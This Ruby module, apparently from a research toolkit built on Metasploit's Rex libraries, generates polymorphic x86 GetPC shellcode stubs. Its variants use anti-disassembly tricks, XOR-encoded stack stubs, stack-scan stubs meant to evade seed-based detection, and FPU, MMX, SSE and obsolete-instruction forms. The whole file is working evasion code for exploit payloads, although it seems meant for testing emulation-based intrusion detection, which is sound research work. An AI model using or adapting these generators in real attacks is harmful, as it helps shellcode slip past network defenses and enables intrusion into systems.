# -*- coding: binary -*-

# =============================================================
# getPC stub generation
#
# @Author: Jos Wetzels
# =============================================================

require 'ebnids/ebnids'
require 'rex/poly'
require 'rex/arch'
require 'rex/text'

module Ebnids

  # getPC stub generator
  class GetPCStub

    #
    # Generate minimally polymorphic, getPC stub that integrates all discussed anti-disassembly techniques
    # Uses garbage bytes, call trick, flow redirection, push/pop math and order is shuffled by code transposition
    #
    # Pre:
    #       - storeReg specifies register in which to store PC
    #       - key is an integer specifying the key to encode the stub with
    #
    # Post:
    #       - storeReg holds PC, code execution is continued at PC
    #
    # Improvements:
    #       - Stronger polymorphism (ie. variable length stub, dynamically determined garbage bytes, dynamically determined anti-disassembly trick insertion, etc.)
    #
    def self.antiDisGetPC(storeReg, badchars, key)
      getPC = Rex::Poly::LogicalBlock.new('getPC',*antiDisGetPC_instructions(storeReg, badchars, key))
      return getPC.generate()
    end

    #
    # Returns the light-polymorphic set of anti-disassembly GetPC stubs
    # 
    # Improvements:
    #        - More variations
    #        - Stronger polymorphism
    #        - Generate a random garbage byte for anti-disassembly purposes which are supplied with context-data (eg. subsequent bytes to better tailor garbage)
    #
  def self.antiDisGetPC_instructions(storeReg, badchars, key)
    antidis = []

    gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]

    # randomly choose registers (may be identical)
    reg1 = gp_regs.sample
    reg2 = gp_regs.sample
    reg3 = gp_regs.sample
    reg4 = gp_regs.sample

    # save PC in storeReg
    regSaver = Rex::Arch::X86.pop_dword(storeReg) + Rex::Arch::X86.pop_dword(storeReg) + Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(storeReg))

    antidis << Rex::Arch::X86.cmp_reg(reg1, reg1) + # opaque predicate
               Rex::Arch::X86.je(0x28) + # je label_1
               Rex::Text.rand_char(badchars) + # garbage byte

               # label_4:
               "\x68" + Rex::Arch::X86.pack_dword(regSaver.unpack('V')[0] ^ key) + # push regSaver ^ key ; push/pop math
               "\x81\x34\x24" + Rex::Arch::X86.pack_dword(key) + # xor [ESP], key
               Rex::Arch::X86.cmp_reg(reg2, reg2) + # opaque predicate
               Rex::Arch::X86.je(0x01) + # je ret_label
               Rex::Text.rand_char(badchars) + # garbage byte

               # ret_label:
               Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(Rex::Arch::X86::ESP)) + # jmp ESP
               Rex::Text.rand_char(badchars) + # garbage byte

               # label_3:
               "\x83\x2C\x24\xFA" + # sub [esp], -(end_label - label_1 +1) ; call trick
               Rex::Arch::X86.mov_word(reg3, 0xE4EB) + # contains jmp to label_4 in middle of instruction
               Rex::Arch::X86.cmp_reg(reg3, reg3) + # opaque predicate
               Rex::Arch::X86.je(-6) + # je to middle of instruction (turning it into jmp to label_4)
               Rex::Text.rand_char(badchars) + # garbage byte

               # label_2:
               Rex::Arch::X86.call(-0x12) + # call label_3
               Rex::Text.rand_char(badchars) + # garbage byte

               # label_1:
               Rex::Arch::X86.cmp_reg(reg4, reg4) + # opaque predicate
               Rex::Arch::X86.je(-10) + # je label_2
               Rex::Text.rand_char(badchars) # garbage byte
               # end_label:

    antidis
  end

    #
    # Generate minimally polymorphic, encoded getPC stub that will be pushed to stack an executed
    #
    # Pre:
    #       - storeReg specifies register in which to store PC
    #       - key is an integer specifying the key to encode the stub with
    #       - keyReg specifies register which will hold key obtained by keygen stub
    #
    # Post:
    #       - storeReg holds PC, code execution is continued at PC
    #
    # Improvements:
    #       - Encode getPC stub with hash derived from key instead of key itself (since static/limited nature of getPC stub makes recovery of key trivial)
    #       - Stronger polymorphism (ie. variable length stub and hence looped encoding instead of static DWORD size)
    #
  def self.encodedStackGetPC(storeReg, badchars, key, keyReg)
		plainStub = self.stackGetPC(storeReg, badchars) # plaintext getPC stub
		encodedStub = (plainStub.unpack('V')[0] ^ key) # encode stub using key

		getPC = Rex::Poly::LogicalBlock.new('getPC',*encodedStackGetPC_instructions(keyReg, badchars, encodedStub))
		return getPC.generate()
  end

    #
    # Returns the light-polymorphic set of encoded stack-based GetPC instruction callers
    # 
    # Improvements:
    #        - More variations
    #        - Stronger polymorphism
    #
	def self.encodedStackGetPC_instructions(keyReg, badchars, encodedStub)

		gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI] - Array[keyReg]
		gp_regs.shuffle

		# random register (that doesn't conflict with keyReg)
		reg1 = gp_regs[0]

		encodedStackGetPCs = []

		encodedStackGetPCs << Rex::Arch::X86.mov_dword(reg1, encodedStub) + # reg1 = encodedStub
							  Rex::Arch::X86.xor_reg(reg1, keyReg) + # reg1 = plainStub
							  Rex::Arch::X86.push_reg(reg1) + # push reg1
							  Rex::Arch::X86.call_reg(Rex::Arch::X86::ESP) # call esp

		encodedStackGetPCs << "\x68" + Rex::Arch::X86.pack_dword(encodedStub) + # push encodedStub
							  "\x31" + (0x04 + (8 * keyReg)).chr + "\x24" + # xor [esp], keyReg
							  Rex::Arch::X86.call_reg(Rex::Arch::X86::ESP) # call esp

		encodedStackGetPCs
	end

    #
    # Generate minimally polymorphic getPC stub that can be pushed to stack
    #
    # Pre:
    #       - [esp] holds PC
    #       - storeReg specifies register in which to store PC
    #
    # Post:
    #       - storeReg holds PC, code execution is continued at PC
    #
    # Improvements:
    #       - Stronger polymorphism (ie. variable length stub instead of static DWORD size)
    #
    def self.stackGetPC(storeReg, badchars)
		getPC = Rex::Poly::LogicalBlock.new('getPC',*stackGetPC_instructions(storeReg, badchars))
    	return getPC.generate()
    end

    #
    # Returns the light-polymorphic set of stack-based GetPC instructions
    # 
    # Improvements:
    #        - Stronger polymorphism (ie. variable length stub, junk data, opaque predicates etc.)
    #
	def self.stackGetPC_instructions(storeReg, badchars)

		randByte = rand(256).chr

		while badchars[randByte] do
			randByte = rand(256).chr
		end

		stackGetPCs = []

		#------------------------
	    stackGetPCs << Rex::Arch::X86.pop_dword(storeReg) +
	                   Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(storeReg)) +
	                   randByte

	    stackGetPCs << Rex::Arch::X86.pop_dword(storeReg) +
	    	           "\x90" + # NOP
	                   Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(storeReg))

	    stackGetPCs << "\x90" + # NOP
	    			   Rex::Arch::X86.pop_dword(storeReg) +
	                   Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(storeReg))

		#------------------------

	    stackGetPCs << Rex::Arch::X86.pop_dword(storeReg) +
	    			   Rex::Arch::X86.push_reg(storeReg) +
	    			   "\xC3" + # RET
	    			   randByte

	    stackGetPCs << Rex::Arch::X86.pop_dword(storeReg) +
	    			   Rex::Arch::X86.push_reg(storeReg) +
	    			   "\x90" + # NOP
	    			   "\xC3" # RET

	    stackGetPCs << Rex::Arch::X86.pop_dword(storeReg) +
	    			   "\x90" + # NOP
	    			   Rex::Arch::X86.push_reg(storeReg) +
	    			   "\xC3" # RET

	    stackGetPCs << "\x90" + # NOP
	    			   Rex::Arch::X86.pop_dword(storeReg) +
	    			   Rex::Arch::X86.push_reg(storeReg) +
	    			   "\xC3" # RET

	    #------------------------

	    stackGetPCs << "\x8B" + (0x04 + (storeReg * 8)).chr + "\x24" + # mov storeReg, [esp]
	    			   "\xC3" # RET 

	    stackGetPCs
	end

    #
    # Generate minimally polymorphic "seed instruction"-less GetPC stub that assumes it's being executed on the stack
    # Aimed at evading seed-based GetPC detection
    #
    # Pre:
    #       - executed on stack
    #       - storeReg specifies register in which to store PC
    #
    # Post:
    #       - storeReg holds PC, code execution is continued at PC
    #
    # Improvements:
    #       - Stronger polymorphism
    #
    def self.stackScanGetPC(storeReg, badchars)
		getPC = Rex::Poly::LogicalBlock.new('getPC',*stackScanGetPC_instructions(storeReg, badchars))
    	return getPC.generate()
    end

    #
    # Returns the light-polymorphic set of stack-scan GetPC instructions
    # 
    # Improvements:
    #        - Stronger polymorphism (ie. more versions, variable length stub, junk data, opaque predicates, randomization of instruction order etc.)
    #
	def self.stackScanGetPC_instructions(storeReg, badchars)
		gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]

		# randomize
		gp_regs.shuffle
		
		# choose two different random registers
		ptrReg = gp_regs[0]
		workReg = gp_regs[1]

		stackScanGetPCs = []

		# Generate random marker and corresponding XOR'ed values (to prevent multiple instances of marker in code)
		begin
			marker = Rex::Text.rand_text(4, badchars)
			xor_val = Rex::Text.rand_text(4, badchars)
			res_val = [(marker.unpack('V')[0] ^ xor_val.unpack('V')[0])].pack('V')
		end while (Rex::Text.badchar_index(res_val, badchars) != nil)

		stub = "\xEB\x04" + #   JMP short (jump over marker)
				marker +
				Rex::Arch::X86.mov_reg(ptrReg, Rex::Arch::X86::ESP) + # mov prtReg, ESP
				"\x8B" + (0x00 + (8 * workReg) + ptrReg).chr + # mov reg, [ptrReg]
				Rex::Arch::X86.xor(workReg, xor_val.unpack('V')[0]) + # xor reg, xor_val
				Rex::Arch::X86.xor(workReg, res_val.unpack('V')[0]) + # xor reg, res_val
				Rex::Arch::X86.cmp_reg(workReg, workReg) + # test reg, reg
				Rex::Arch::X86.je(3) + # JE 0x03
				(0x40 | ptrReg).chr + # INC ptrReg
				Rex::Arch::X86.jmp_short(-21) # jmp back

		stub = stub  + "\x8D" + (0x40 + (8 * storeReg) + ptrReg).chr + (stub.bytesize + 3 - 2).chr # LEA storeReg, [ptrReg + (stublen - marker_offset)]

	    stackScanGetPCs << stub

        stackScanGetPCs
	end

    #
    # Generate minimally polymorphic FPU-based GetPC stub
    #
    # Pre:
    #       - storeReg specifies register in which to store PC
    #
    # Post:
    #       - storeReg holds PC, code execution is continued at PC
    #
    # Improvements:
    #       - Stronger polymorphism
    #       - Additional approaches (besides FNSTENV, FSAVE)
    #
	def self.fpuGetPC(storeReg, badchars)
    	fpuInstruction = Rex::Poly::LogicalBlock.new('fpuInstruction',*fpu_instructions) # Execute FPU instruction to set FPU PC pointer
      	fpuSave = Rex::Poly::LogicalBlock.new('fpuSave',*fpu_save_instructions(storeReg, badchars)) 
      	fpuSave.depends_on(fpuInstruction)
    	return fpuSave.generate()
    end

	#
	# Returns the set of FPU instructions that can be used for the FPU block of the decoder stub.	  # 
	# (Taken from shikata_ga_nai)
	#
	def self.fpu_instructions()
	  fpus = []

	  0xe8.upto(0xee) { |x| fpus << "\xd9" + x.chr }
	  0xc0.upto(0xcf) { |x| fpus << "\xd9" + x.chr }
	  0xc0.upto(0xdf) { |x| fpus << "\xda" + x.chr }
	  0xc0.upto(0xdf) { |x| fpus << "\xdb" + x.chr }
	  0xc0.upto(0xc7) { |x| fpus << "\xdd" + x.chr }

	  fpus << "\xd9\xd0"
	  fpus << "\xd9\xe1"
	  fpus << "\xd9\xf6"
	  fpus << "\xd9\xf7"
	  fpus << "\xd9\xe5"

	  # This FPU instruction seems to fail consistently on Linux
	  #fpus << "\xdb\xe1"

	  fpus
	end

  	#
  	# Returns the set of FPU store + pop/mov2reg instructions that can be used for the getPC stub
  	# Note:
  	#        - make more polymorphic
  	#
  	def self.fpu_save_instructions(storeReg, badchars)
  		# FNSTENV [ESP - 0xC]
  		fnstenvStoreInstruction = "\xD9\x74\x24\xf4"

  		# FNSAVE [ESP - 0x6C]
  		fnsaveStoreInstruction = "\xDD\x74\x24\x94"

  		fpu_saves = []

  		fpu_saves << fnstenvStoreInstruction +
  					 Rex::Arch::X86.pop_dword(storeReg) + # POP storeReg
  					 Rex::Arch::X86.sub(-10, storeReg, badchars, false, true) # SUB storeReg,-10

  		fpu_saves << fnstenvStoreInstruction +
  					 "\x8B" + (0x04 + (8 * storeReg)).chr + "\x24" + # mov storeReg, [ESP]
  					 Rex::Arch::X86.sub(-12, storeReg, badchars, false, true) # SUB storeReg,-10

	    fpu_saves << fnsaveStoreInstruction +
	    			 Rex::Arch::X86.sub(0x60, Rex::Arch::X86::ESP, badchars, false, true) + # SUB ESP,0x60
	    			 Rex::Arch::X86.pop_dword(storeReg) + # POP storeReg
	    			 Rex::Arch::X86.sub(-0x60, Rex::Arch::X86::ESP, badchars, false, true) + # SUB ESP,-0x60
	                 Rex::Arch::X86.sub(-0x10, storeReg, badchars, false, true) # SUB storeReg, -0xD

	    fpu_saves << fnsaveStoreInstruction +
	                 "\x8B" + (0x44 + (8 * storeReg)).chr + "\x24\xA0" + # MOV storeReg,[ESP-0x60]
	                 Rex::Arch::X86.sub(-0x0D, storeReg, badchars, false, true) # SUB storeReg, -0xD

  		fpu_saves
  	end

    #
    # Generate non-polymorphic MMX-based GetPC stub
    #
    # Pre:
    #       - storeReg specifies register in which to store PC
    #
    # Post:
    #       - storeReg holds PC, code execution is continued at PC
    #
    # Improvements:
    #       - Stronger polymorphism
    #       - Additional approaches
    #
	def self.mmxGetPC(storeReg, badchars)
	    mmx = Rex::Poly::LogicalBlock.new('mmx',*mmx_instructions(storeReg, badchars)) # mmx stub
	    return mmx.generate()
    end

  	#
  	# Returns the set of MMX GetPC stubs
  	# Note:
  	#        - make polymorphic
  	#        - TODO: implement in non-getPC seeding way
  	#        - additional approaches (eg. other integrations of MMX instructions) and variations (eg. POP instead of MOVD reg, [ESP])
  	#
  	def self.mmx_instructions(storeReg, badchars)
	    mmxs = []

 		# MM0
	    storeReg = 0
	    # MM1
	    reg2 = 1

	    mmxs << Rex::Arch::X86.jmp_short(0x0E) + # jmp short to CALL instruction
	            "\x0F\x6E" + (0x04 + (8 * storeReg)).chr + "\x24" + # MOVD storeReg,DWORD PTR SS:[ESP]
	            "\x0F\xEF" + (0xC0 + (9 * reg2)).chr + # PXOR reg2, reg2
	            "\x0F\xFE" + (0xC0 + (reg2 * 8) + storeReg).chr + # PADDD reg2, storeReg
	            "\x0F\x7E" + (0xC0 + (8 * reg2) + storeReg).chr + # MOVD storeReg, reg2
	            # TODO: polymorphize between RETN, JMP storeReg, etc.
	            "\xC3" + # RETN
	    		Rex::Arch::X86.call(-19) # call to MOVD instruction

	    mmxs
  	end


    #
    # Generate non-polymorphic SSE-based GetPC stub
    #
    # Pre:
    #       - storeReg specifies register in which to store PC
    #
    # Post:
    #       - storeReg holds PC, code execution is continued at PC
    #
    # Improvements:
    #       - Add polymorphism
    #       - Additional approaches
    #
	def self.sseGetPC(storeReg, badchars)
	    sse = Rex::Poly::LogicalBlock.new('sse',*sse_instructions(storeReg, badchars)) # mmx stub
	    return sse.generate()
    end

  	#
  	# Returns the set of SSE GetPC stubs
  	# Note:
  	#        - make polymorphic
  	#        - TODO: implement in non-getPC seeding way
  	#        - additional approaches (eg. other integrations of SSE instructions) and variations (eg. POP instead of MOVD reg, [ESP])
  	#
  	def self.sse_instructions(storeReg, badchars)
	    sses = []

	    reg2 = Rex::Arch::X86::ECX
	    # XMM0
	    sseReg1 = 0
	    # XMM1
	    sseReg2 = 1

	    sses << Rex::Arch::X86.jmp_short(0x2A) + # jmp short to CALL instruction
	    		Rex::Arch::X86.xor_reg(storeReg, storeReg) + # xor storeReg, storeReg
	    		Rex::Arch::X86.xor_reg(reg2, reg2) + # xor reg2, reg2
	    		Rex::Arch::X86.sub(-13, reg2, badchars, false, true) + # SUB reg2,-10
	    		"\xF3\x0F\xBD" + (0xC0 + reg2 + (8 * storeReg)).chr + #  lzcnt storeReg, reg2
	    		"\x83" + (0xF8 + storeReg).chr + "\x03" + #        CMP storeReg,3
	    		"\x0F\x43" + (0x04 + (8 * storeReg)).chr + "\x24" + #       CMOVNB storeReg,DWORD PTR SS:[ESP]
	    		Rex::Arch::X86.push_reg(storeReg) +
				"\xF3\x0F\x10" + (0x04 + (8 * sseReg1)).chr + "\x24" + #    MOVSS sseReg1,DWORD PTR SS:[ESP]
	    		Rex::Arch::X86.pop_dword(storeReg) + 
	    		"\x89" + (0x04 + (8 * reg2)).chr + "\x24" + 		# MOV [ESP], reg2
	    		"\x66\x0F\xEF" + (0xC0 + sseReg2 + (8 * sseReg2)).chr + #      PXOR sseReg2, sseReg2
	    		"\xF3\x0F\x5F" + (0xC0 + sseReg1 + (8 * sseReg2)).chr + #      MAXSS XMM1,XMM0
	    		"\xF3\x0F\x11" + (0x04 + (8 * sseReg2)).chr + "\x24" + #    MOVSS DWORD PTR SS:[ESP],XMM1
	    		"\xC3" + #             RETN
				Rex::Arch::X86.call(-0x2F) # call to xor instruction

	    sses
  	end


    #
    # Generate non-polymorphic "obsolete instruction"-based GetPC stub
    #
    # Pre:
    #       - storeReg specifies register in which to store PC
    #
    # Post:
    #       - storeReg holds PC, code execution is continued at PC
    #
    # Improvements:
    #       - Add polymorphism
    #       - Additional approaches
    #
	def self.obsolGetPC(storeReg, badchars)
	    obsol = Rex::Poly::LogicalBlock.new('obsol',*obsol_instructions(storeReg, badchars)) # mmx stub
	    return obsol.generate()
    end

  	#
  	# Returns the set of "obsolete instruction" GetPC stubs
  	# Note:
  	#        - make polymorphic
  	#        - TODO: implement in non-getPC seeding way
  	#        - additional approaches (eg. other integrations of 'obsolete' instructions) and variations
  	#
  	def self.obsol_instructions(storeReg, badchars)
  		# reg2 cannot be eax
  		gp_regs = Array[Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]

  		gp_regs.shuffle

  		reg2 = gp_regs[0]
  		
  		# reg3 cannot be eax, ecx or ebx
  		gp_regs = gp_regs - Array[Rex::Arch::X86::ECX, Rex::Arch::X86::EBX]
  		gp_regs.shuffle
  		reg3 = gp_regs[0]

	    obsols = []

	    obsols << Rex::Arch::X86.jmp_short(0x43) + #          JMP SHORT CALL
	    		  Rex::Arch::X86.set(Rex::Arch::X86::EAX, 0) + # eax = 0
	              "\xF9" + #             STC
	              "\xD6" + #             SALC
	              Rex::Arch::X86.cmp_reg(Rex::Arch::X86::EAX, Rex::Arch::X86::EAX) + # TEST eax, eax
	              Rex::Arch::X86.je(0x3B) +
	              "\x80" + (0xF0 + Rex::Arch::X86::EAX).chr + "\xFF" + # XOR AH, 0xFF
	              Rex::Arch::X86.mov_reg(storeReg, Rex::Arch::X86::EAX) + # mov storeReg, eax
	              "\x87" + (0xC0 + storeReg + (8 * reg2)).chr + # XCHG storeReg, reg2
	              Rex::Arch::X86.mov_dword(storeReg, 0x208FFFF) + # MOV storeReg, 208FFFF
	              Rex::Arch::X86.xor(storeReg, 0x301FFFF) + # XOR storeReg, 301FFFF
	              "\x0F" + (0xC8 + storeReg).chr + # BSWAP storeReg
	              "\xD5\x02" + #          AAD 2
				  "\x87" + (0xC0 + storeReg + (8 * reg3)).chr + # XCHG storeReg, reg3
				  "\x40" + # INC eax to clear any previously set zero flags
	              "\x63" + (0xC0 + reg3 + (8 * storeReg)).chr + #           ARPL reg3 (16-bit),storeReg (16-bit)
	              Rex::Arch::X86.je(0x1E) +
	              "\x66\x33" + (0xC0 + reg3 + (8 * reg3)).chr + #        XOR reg3 (16-bit), reg3 (16-bit)
	              Rex::Arch::X86.add_reg(reg3, Rex::Arch::X86::ESP) + # ADD reg3, ESP
	              Rex::Arch::X86.mov_reg(Rex::Arch::X86::EBX, reg3) + # MOV EBX, reg3
	              Rex::Arch::X86.set(reg3, 0) + # reg3 = 0
	              Rex::Arch::X86.sub(-4, Rex::Arch::X86::ECX, badchars) + # ecx = 4

	              Rex::Arch::X86.xor_reg(Rex::Arch::X86::EAX, Rex::Arch::X86::EAX) + # xor eax, eax
	              "\xD7" + #             XLAT BYTE PTR DS:[EBX+AL]
	              "\xC1" + (0xE0 + reg3).chr + "\x08" + #        SHL reg3,8
	              "\x8A" + (0xC0 + Rex::Arch::X86::EAX + (8 * reg3)).chr + #           MOV reg3 (8-bit), DL (8-bit)
	              (0x40 + Rex::Arch::X86::EBX).chr + #             INC EBX
	              Rex::Arch::X86.loop(-11) + # loop xor eax,eax

	              "\x0F" + (0xC8 + reg3).chr + # BSWAP reg3
	              Rex::Arch::X86.mov_reg(storeReg, reg3) + # MOV storeReg, reg3
	              "\xC3" + #             RETN
	              Rex::Arch::X86.call(-0x48) # CALL to xor instruction

	    obsols
  	end


  end


end